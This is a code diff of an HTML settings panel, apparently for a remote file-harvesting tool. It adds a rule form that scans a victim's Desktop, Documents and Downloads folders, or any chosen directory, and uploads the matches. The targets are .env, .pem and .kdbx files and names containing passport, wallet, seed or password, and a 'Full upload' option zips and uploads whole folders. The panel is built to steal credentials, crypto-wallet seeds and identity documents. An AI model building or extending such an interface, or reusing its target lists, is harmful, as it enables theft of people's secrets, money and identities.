@@ -112,12 +112,26 @@
           <div class="setting-block setting-sub" id="ah-file-list-block">
             <div class="setting-info" style="margin-bottom:8px">
               <span class="setting-name">Auto-upload file list</span>
-              <span class="setting-desc">When file scan is on, only match these. Extensions/names (e.g. <code>.env</code>, <code>config.json</code>) and name-contains keywords (e.g. passport, seed).</span>
+              <span class="setting-desc">Add rules: scan a directory for matching files, or check <strong>Full upload</strong> to zip and upload the whole folder. Leave dir empty to use default user folders (Desktop, Documents, Downloads, …). Save is automatic when you click Add or toggles.</span>
             </div>
-            <label class="setting-field-label">Extensions / exact filenames (comma or newline)</label>
-            <textarea id="auto-file-exts" class="input settings-textarea" rows="2" placeholder=".env, config.json, .pem, .kdbx" disabled></textarea>
-            <label class="setting-field-label">Name contains (comma or newline)</label>
-            <textarea id="auto-file-names" class="input settings-textarea" rows="2" placeholder="ID card, passport, wallet, seed, password" disabled></textarea>
+            <div class="file-rule-form" id="file-rule-form">
+              <div class="file-rule-inputs">
+                <label class="setting-field-label">File extension
+                  <input type="text" id="rule-ext" class="input" placeholder=".env or .pdf" disabled />
+                </label>
+                <label class="setting-field-label">Name contains
+                  <input type="text" id="rule-name" class="input" placeholder="passport, seed, wallet…" disabled />
+                </label>
+                <label class="setting-field-label">Dir path
+                  <input type="text" id="rule-dir" class="input" placeholder="Documents or C:\Users\…\Desktop" disabled />
+                </label>
+                <label class="file-rule-full chk-inline">
+                  <input type="checkbox" id="rule-full" disabled /> Full upload (entire folder)
+                </label>
+              </div>
+              <button type="button" class="btn btn-sm" id="rule-add-btn" disabled>Add</button>
+            </div>
+            <ul class="file-rule-list" id="file-rule-list"></ul>
           </div>
           <div style="height:1px;background:var(--border);margin:10px 0"></div>
           <div class="setting-row">
